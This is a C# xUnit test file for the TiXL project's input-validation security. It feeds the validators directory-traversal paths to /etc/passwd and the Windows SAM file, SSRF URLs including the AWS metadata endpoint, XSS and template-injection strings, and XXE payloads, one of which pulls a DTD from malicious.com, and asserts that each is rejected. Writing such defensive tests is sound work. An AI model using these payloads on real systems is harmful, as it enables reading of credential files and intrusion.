using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using Xunit;
using TiXL.Core.IO;
using System.Net.Sockets;
using System.Collections.Generic;

namespace TiXL.Tests.Security
{
    /// <summary>
    /// Comprehensive security tests for input handling across all I/O sources
    /// Tests cover: File I/O, Network I/O, Audio/MIDI I/O, and Serialization
    /// </summary>
    public class InputHandlingSecurityTests : IDisposable
    {
        private readonly SafeFileIO _safeFileIO;
        private readonly NetworkIOHandler _networkHandler;
        private readonly AudioIOHandler _audioHandler;
        private readonly MidiIOHandler _midiHandler;
        private readonly string _testDirectory;

        public InputHandlingSecurityTests()
        {
            _safeFileIO = SafeFileIO.Instance;
            _networkHandler = new NetworkIOHandler();
            _audioHandler = new AudioIOHandler();
            _midiHandler = new MidiIOHandler();
            _testDirectory = Path.Combine(Path.GetTempPath(), "TiXL_Security_Tests");
            Directory.CreateDirectory(_testDirectory);
        }

        #region File I/O Security Tests

        [Fact]
        public async Task FileInputValidation_PreventsDirectoryTraversal()
        {
            // Test directory traversal attacks
            var maliciousPaths = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "C:\\Windows\\System32\\config\\sam",
                "/etc/passwd",
                "\\\\localhost\\share\\file.txt"
            };

            foreach (var maliciousPath in maliciousPaths)
            {
                var validation = _safeFileIO.ValidateReadPath(Path.Combine(_testDirectory, maliciousPath));
                Assert.False(validation.IsValid, $"Path '{maliciousPath}' should be blocked");
                Assert.Contains("path traversal", validation.ErrorMessage.ToLowerInvariant());
            }
        }

        [Fact]
        public async Task FileInputValidation_ValidatesFileSize()
        {
            // Test oversized file handling
            var oversizedContent = new byte[101 * 1024 * 1024]; // 101MB
            var testFile = Path.Combine(_testDirectory, "oversized_test.bin");
            
            await File.WriteAllBytesAsync(testFile, oversizedContent);
            
            var validation = _safeFileIO.ValidateReadPath(testFile);
            Assert.False(validation.IsValid, "Oversized file should be rejected");
            Assert.Contains("size", validation.ErrorMessage.ToLowerInvariant());
            
            File.Delete(testFile);
        }

        [Fact]
        public async Task FileInputValidation_PreventsNullBytes()
        {
            // Test null byte injection
            var maliciousContent = "valid content\x00.malicious_extension";
            var testFile = Path.Combine(_testDirectory, "null_byte_test.txt");
            
            await File.WriteAllBytesAsync(testFile, Encoding.UTF8.GetBytes(maliciousContent));
            
            // Test file read validation
            var readResult = await _safeFileIO.SafeReadAllBytesAsync(testFile);
            Assert.False(readResult.IsSuccess, "Files with null bytes should be rejected");
            
            File.Delete(testFile);
        }

        [Fact]
        public async Task FileInputValidation_ValidatesPathCharacters()
        {
            // Test dangerous path characters
            var dangerousPaths = new[]
            {
                "file<>:\"|?*test.txt",
                "file\x00test.txt",
                "file\x1Ftest.txt",
                "con.txt", // Windows reserved name
                "prn.txt", // Windows reserved name
                "aux.txt", // Windows reserved name
                "nul.txt"  // Windows reserved name
            };

            foreach (var dangerousPath in dangerousPaths)
            {
                var fullPath = Path.Combine(_testDirectory, dangerousPath);
                var validation = _safeFileIO.ValidateWritePath(fullPath);
                Assert.False(validation.IsValid, $"Dangerous path '{dangerousPath}' should be blocked");
            }
        }

        [Fact]
        public async Task FileInputValidation_ValidatesExtensions()
        {
            // Test dangerous file extensions
            var dangerousExtensions = new[]
            {
                ".exe",
                ".bat", 
                ".cmd",
                ".com",
                ".scr",
                ".pif",
                ".js",
                ".vbs",
                ".jar",
                ".ps1"
            };

            foreach (var extension in dangerousExtensions)
            {
                var testFile = Path.Combine(_testDirectory, $"test{extension}");
                var validation = _safeFileIO.ValidateWritePath(testFile);
                Assert.False(validation.IsValid, $"Extension '{extension}' should be blocked");
            }
        }

        #endregion

        #region Network I/O Security Tests

        [Fact]
        public async Task NetworkInputValidation_ValidatesEndpoint()
        {
            // Test malicious endpoints
            var maliciousEndpoints = new[]
            {
                "http://localhost:22/", // SSH port
                "http://127.0.0.1:3389/", // RDP port  
                "http://169.254.169.254/latest/meta-data/", // AWS metadata
                "file:///etc/passwd",
                "ftp://user:pass@malicious.com/file.txt",
                "http://user@malicious.com/file.txt",
                "http://malicious.com/file.txt<script>alert('xss')</script>",
                "http://malicious.com/../../../../etc/passwd"
            };

            foreach (var maliciousEndpoint in maliciousEndpoints)
            {
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.NetworkIO,
                    Data = Encoding.UTF8.GetBytes("test data"),
                    Metadata = new Dictionary<string, string> { { "Endpoint", maliciousEndpoint } }
                };

                // Should handle malicious endpoint gracefully
                await Assert.ThrowsAsync<InvalidOperationException>(() => 
                    _networkHandler.ProcessNetworkEventAsync(ioEvent));
            }
        }

        [Fact]
        public async Task NetworkInputValidation_LimitsBufferSize()
        {
            // Test oversized network payload
            var oversizedData = new byte[10 * 1024 * 1024]; // 10MB
            var endpoint = "http://example.com/api";
            
            var ioEvent = new IOEvent
            {
                Id = $"test_{Guid.NewGuid()}",
                EventType = IOEventType.NetworkIO,
                Data = oversizedData,
                Metadata = new Dictionary<string, string> { { "Endpoint", endpoint } }
            };

            await Assert.ThrowsAsync<InvalidOperationException>(() => 
                _networkHandler.ProcessNetworkEventAsync(ioEvent));
        }

        [Fact]
        public async Task NetworkInputValidation_ValidatesProtocol()
        {
            // Test unsupported protocols
            var unsupportedProtocols = new[] { "ftp://", "file://", "data://", "javascript://" };
            
            foreach (var protocol in unsupportedProtocols)
            {
                var endpoint = $"{protocol}example.com/file";
                
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.NetworkIO,
                    Data = Encoding.UTF8.GetBytes("test data"),
                    Metadata = new Dictionary<string, string> { { "Endpoint", endpoint } }
                };

                await Assert.ThrowsAsync<NotSupportedException>(() => 
                    _networkHandler.ProcessNetworkEventAsync(ioEvent));
            }
        }

        #endregion

        #region Audio/MIDI Security Tests

        [Fact]
        public async Task AudioInputValidation_PreventsBufferOverflow()
        {
            // Test oversized audio data
            var oversizedAudio = new byte[100 * 1024 * 1024]; // 100MB
            
            var ioEvent = new IOEvent
            {
                Id = $"test_{Guid.NewGuid()}",
                EventType = IOEventType.AudioInput,
                Data = oversizedAudio
            };

            await Assert.ThrowsAsync<InvalidOperationException>(() => 
                _audioHandler.ProcessAudioEventAsync(ioEvent));
        }

        [Fact]
        public async Task AudioInputValidation_ValidatesAudioParameters()
        {
            // Test invalid audio parameters
            var testCases = new[]
            {
                new { SampleRate = -1, Channels = -1, BitDepth = -1 },
                new { SampleRate = 0, Channels = 0, BitDepth = 0 },
                new { SampleRate = 1920000, Channels = 1000, BitDepth = 1000 },
                new { SampleRate = 44100, Channels = 1000, BitDepth = 16 },
                new { SampleRate = 44100, Channels = 2, BitDepth = 128 }
            };

            foreach (var testCase in testCases)
            {
                // Audio handler should validate parameters internally
                var audioData = new byte[1024];
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.AudioInput,
                    Data = audioData
                };

                // Should handle gracefully with error events
                await _audioHandler.ProcessAudioEventAsync(ioEvent);
            }
        }

        [Fact]
        public async Task MidiInputValidation_ValidatesMidiFormat()
        {
            // Test malformed MIDI data
            var malformedMidiData = new byte[]
            {
                // Invalid MIDI status byte
                0xFF, 0xFF, 0xFF,  // Invalid status
                0x00, 0x00,        // Incomplete data
                0x90, 0x7F,        // Note On without velocity
                0x90               // Truncated message
            };

            var ioEvent = new IOEvent
            {
                Id = $"test_{Guid.NewGuid()}",
                EventType = IOEventType.MidiInput,
                Data = malformedMidiData
            };

            // Should handle malformed MIDI gracefully
            await _midiHandler.ProcessMidiEventAsync(ioEvent);
        }

        [Fact]
        public async Task MidiInputValidation_ValidatesMidiRanges()
        {
            // Test out-of-range MIDI values
            var invalidMidiEvents = new[]
            {
                new byte[] { 0x90, 0xFF, 0xFF }, // Note 255 (out of range)
                new byte[] { 0x90, 0x00, 0xFF }, // Velocity 255 (out of range)
                new byte[] { 0xB0, 0xFF, 0xFF }, // Controller 255 (out of range)
                new byte[] { 0x90, 0x00, 0x00 }  // Zero velocity Note On
            };

            foreach (var midiEvent in invalidMidiEvents)
            {
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.MidiInput,
                    Data = midiEvent
                };

                // Should validate and potentially clamp values
                await _midiHandler.ProcessMidiEventAsync(ioEvent);
            }
        }

        [Fact]
        public async Task AudioInputValidation_LimitsConcurrentBuffers()
        {
            // Test buffer limit enforcement
            var audioData = new byte[4096];
            
            for (int i = 0; i < 15; i++) // Exceed the 10 buffer limit
            {
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.AudioInput,
                    Data = audioData
                };

                if (i >= 10)
                {
                    // Should eventually hit buffer limits
                    await Assert.ThrowsAnyAsync<Exception>(() => 
                        _audioHandler.ProcessAudioEventAsync(ioEvent));
                }
                else
                {
                    await _audioHandler.ProcessAudioEventAsync(ioEvent);
                }
            }
        }

        #endregion

        #region Serialization Security Tests

        [Fact]
        public async Task SerializationSecurity_ValidatesJsonSize()
        {
            // Test oversized JSON
            var largeObject = new { Data = new string('x', 100 * 1024 * 1024) };
            
            var testFile = Path.Combine(_testDirectory, "large_json.json");
            var result = await SafeSerialization.SafeSerializeToJsonAsync(largeObject, testFile);
            
            Assert.False(result.IsSuccess, "Large JSON should be rejected");
            Assert.Contains("large", result.ErrorMessage.ToLowerInvariant());
        }

        [Fact]
        public async Task SerializationSecurity_ValidatesJsonStructure()
        {
            // Test malicious JSON content
            var maliciousJson = @"{
    ""maliciousField"": ""<script>alert('xss')</script>"",
    ""commandField"": ""{{constructor.constructor('return process')().exit()}}"",
    ""filePath"": ""../../../../etc/passwd"",
    ""largeArray"": [1, 2, 3, "" + new string('x', 1000000) + @"],
    ""nullBytes"": ""test\x00value""
}";

            var testFile = Path.Combine(_testDirectory, "malicious.json");
            await File.WriteAllTextAsync(testFile, maliciousJson);
            
            // Should scan for threats
            var scanResult = SafeSerialization.ScanForSecurityThreats(testFile);
            Assert.False(scanResult.IsValid, "Malicious JSON should be detected");
            
            File.Delete(testFile);
        }

        [Fact]
        public async Task SerializationSecurity_ValidatesXmlStructure()
        {
            // Test malicious XML
            var maliciousXml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM ""file:///etc/passwd"">
]>
<root>
    <field>&xxe;</field>
    <script><![CDATA[<script>alert('xss')</script>]]></script>
    <command>{{constructor.constructor('return process')().exit()}}</command>
</root>";

            var testFile = Path.Combine(_testDirectory, "malicious.xml");
            await File.WriteAllTextAsync(testFile, maliciousXml);
            
            // Should scan for threats
            var scanResult = SafeSerialization.ScanForSecurityThreats(testFile);
            Assert.False(scanResult.IsValid, "Malicious XML should be detected");
            
            File.Delete(testFile);
        }

        [Fact]
        public async Task SerializationSecurity_PreventsXmlExternalEntity()
        {
            // Test XXE attack prevention
            var xxeXml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM ""http://malicious.com/evil.dtd"">
%remote;
]>
<root>
    <data>test</data>
</root>";

            var testFile = Path.Combine(_testDirectory, "xxe_test.xml");
            await File.WriteAllTextAsync(testFile, xxeXml);
            
            // Should reject XXE attacks
            var result = await SafeSerialization.SafeDeserializeFromXmlAsync<object>(testFile);
            Assert.False(result.IsSuccess, "XXE attack should be prevented");
            
            File.Delete(testFile);
        }

        #endregion

        #region Buffer Overflow Prevention Tests

        [Theory]
        [InlineData(0)]
        [InlineData(-1)]
        [InlineData(int.MaxValue)]
        public void CircularBuffer_ValidatesCapacity(int capacity)
        {
            if (capacity <= 0)
            {
                Assert.Throws<ArgumentException>(() => new CircularBuffer<object>(capacity));
            }
            else
            {
                var buffer = new CircularBuffer<object>(capacity);
                Assert.Equal(capacity, buffer.Capacity);
            }
        }

        [Fact]
        public void CircularBuffer_PreventsOverflow()
        {
            var buffer = new CircularBuffer<int>(5);
            
            // Add more items than capacity
            for (int i = 0; i < 10; i++)
            {
                buffer.Add(i);
            }
            
            // Should only keep the 5 most recent
            var recentItems = buffer.GetRecentItems(5);
            Assert.Equal(5, recentItems.Count);
            Assert.True(recentItems[4] == 9, "Should contain most recent items");
        }

        #endregion

        #region Performance and Resource Tests

        [Fact]
        public async Task InputValidation_DoesNotCauseResourceExhaustion()
        {
            // Test concurrent file operations
            var tasks = new List<Task>();
            
            for (int i = 0; i < 100; i++)
            {
                var testFile = Path.Combine(_testDirectory, $"concurrent_test_{i}.txt");
                var content = Encoding.UTF8.GetBytes($"test content {i}");
                
                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        var validation = _safeFileIO.ValidateWritePath(testFile);
                        if (validation.IsValid)
                        {
                            await _safeFileIO.SafeWriteAsync(testFile, content);
                        }
                    }
                    catch
                    {
                        // Expected for some concurrent operations
                    }
                }));
            }
            
            await Task.WhenAll(tasks);
            
            // Cleanup
            var files = Directory.GetFiles(_testDirectory, "concurrent_test_*.txt");
            foreach (var file in files)
            {
                try { File.Delete(file); } catch { }
            }
        }

        #endregion

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(_testDirectory))
                {
                    Directory.Delete(_testDirectory, true);
                }
            }
            catch
            {
                // Best effort cleanup
            }

            _networkHandler?.Dispose();
            _audioHandler?.Dispose();
            _midiHandler?.Dispose();
        }
    }

    /// <summary>
    /// Additional security-focused input validation tests
    /// </summary>
    public class InputValidationEdgeCaseTests : IDisposable
    {
        private readonly SafeFileIO _safeFileIO;
        private readonly string _testDirectory;

        public InputValidationEdgeCaseTests()
        {
            _safeFileIO = SafeFileIO.Instance;
            _testDirectory = Path.Combine(Path.GetTempPath(), "TiXL_EdgeCase_Tests");
            Directory.CreateDirectory(_testDirectory);
        }

        [Fact]
        public async Task FileInputValidation_HandlesUnicodePaths()
        {
            // Test Unicode path handling
            var unicodePaths = new[]
            {
                "тест.txt", // Cyrillic
                "测试.txt", // Chinese
                "اختبار.txt", // Arabic
                "テスト.txt", // Japanese
                "🔒secret.txt", // Emoji
                "file with spaces.txt",
                "file\twith\ttabs.txt"
            };

            foreach (var path in unicodePaths)
            {
                var fullPath = Path.Combine(_testDirectory, path);
                var validation = _safeFileIO.ValidateWritePath(fullPath);
                // Unicode should be handled properly (either allowed or blocked consistently)
                Assert.NotNull(validation);
            }
        }

        [Fact]
        public async Task NetworkInputValidation_HandlesProtocolDowngrade()
        {
            // Test protocol downgrade attacks
            var downgradeAttacks = new[]
            {
                "HTTP://EXAMPLE.COM", // Uppercase protocol
                "HtTp://example.com", // Mixed case
                "http://example.com@malicious.com", // User@host bypass
                "http://example.com:80@malicious.com", // Port and user bypass
                "https://http://example.com", // Protocol nesting
                "http:///example.com", // Missing host
                "http://example.com:port", // Invalid port
            };

            foreach (var attack in downgradeAttacks)
            {
                var ioEvent = new IOEvent
                {
                    Id = $"test_{Guid.NewGuid()}",
                    EventType = IOEventType.NetworkIO,
                    Data = Encoding.UTF8.GetBytes("test"),
                    Metadata = new Dictionary<string, string> { { "Endpoint", attack } }
                };

                await Assert.ThrowsAsync<Exception>(() => 
                    new NetworkIOHandler().ProcessNetworkEventAsync(ioEvent));
            }
        }

        [Fact]
        public async Task AudioInputValidation_HandlesInvalidEncoding()
        {
            // Test invalid audio data encoding
            var invalidAudioData = new byte[]
            {
                0xFF, 0xFF, 0xFF, 0xFF, // Invalid PCM header
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };

            var ioEvent = new IOEvent
            {
                Id = $"test_{Guid.NewGuid()}",
                EventType = IOEventType.AudioInput,
                Data = invalidAudioData
            };

            await Assert.ThrowsAsync<Exception>(() => 
                new AudioIOHandler().ProcessAudioEventAsync(ioEvent));
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(_testDirectory))
                {
                    Directory.Delete(_testDirectory, true);
                }
            }
            catch
            {
                // Best effort cleanup
            }
        }
    }
}